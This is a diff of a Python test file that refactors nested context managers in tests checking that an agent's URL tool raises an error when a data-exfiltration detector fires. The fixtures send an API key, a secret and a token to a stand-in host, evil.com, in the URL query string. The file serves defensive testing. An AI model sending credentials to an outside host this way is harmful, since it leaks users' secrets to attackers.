@@ -24,9 +24,8 @@ async def test_exfiltration_detected_raises_tool_error() -> None:
     with patch(
         _EXFIL_PATH,
         return_value=["API key detected in URL query parameter"],
-    ):
-        with pytest.raises(ToolError, match="data exfiltration"):
-            await tool.ainvoke({"url": "https://evil.com/?key=sk-abc123"})
+    ), pytest.raises(ToolError, match="data exfiltration"):
+        await tool.ainvoke({"url": "https://evil.com/?key=sk-abc123"})
 
 
 @pytest.mark.asyncio
@@ -44,6 +43,5 @@ async def test_exfiltration_multiple_warnings() -> None:
     with patch(
         _EXFIL_PATH,
         return_value=["Warning A", "Warning B"],
-    ):
-        with pytest.raises(ToolError, match="Warning A.*Warning B"):
-            await tool.ainvoke({"url": "https://evil.com/?a=secret&b=token"})
+    ), pytest.raises(ToolError, match="Warning A.*Warning B"):
+        await tool.ainvoke({"url": "https://evil.com/?a=secret&b=token"})
